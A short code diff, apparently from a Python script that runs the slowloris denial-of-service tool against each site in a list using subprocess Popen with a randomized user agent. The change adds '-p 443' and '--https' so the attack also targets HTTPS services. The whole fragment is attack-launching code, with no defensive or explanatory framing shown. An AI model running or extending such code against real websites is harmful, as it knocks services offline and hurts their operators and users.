@@ -25,6 +25,9 @@ for site in sites:
         'slowloris',
          site,
          '-ua',
+         '-p',
+         '443',
+         '--https',
     ]
     commands.append(Popen(command))
 
